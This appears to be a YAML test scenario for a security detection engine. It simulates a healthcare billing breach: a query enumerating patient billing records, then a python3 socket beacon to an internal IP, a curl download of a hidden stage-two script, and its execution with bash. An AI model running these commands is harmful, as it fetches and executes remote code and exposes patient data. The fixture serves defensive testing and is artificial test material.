scenario_id: hc3_pivot_internal_billing_mal
family_id: healthcare_lateral_pivot_billing
domain: healthcare
time_of_day: "00:50"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: billing_probe
    role: billing_clerk
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [2.5]
    events:
      - step_id: enumerate_billing
        sql: "SELECT invoice_id, patient_id, insurance_id, amount FROM billing"
  - session_label: internal_stage
    role: billing_clerk
    anchor: synthetic
    anchor_query: "SELECT 1"
    delay_after_previous_seconds: 10
    timing:
      tempo: bursty
      step_gaps_seconds: [0.6]
    events:
      - step_id: spawn_agent
        process: {comm: python3, args: ["-c", "import socket; s=socket.socket(); s.connect(('192.168.14.22', 8443))"]}
      - step_id: beacon
        connect: {ip: "192.168.14.22", port: 8443, parent: spawn_agent}
      - step_id: fetch_payload
        process: {comm: curl, args: ["-s", "http://192.168.14.22:8080/stage2.sh", "-o", "/tmp/.stage2.sh"], parent: spawn_agent}
        connects_to: {ip: "192.168.14.22", port: 8080}
      - step_id: run_stage2
        process: {comm: bash, args: ["/tmp/.stage2.sh"], parent: fetch_payload}
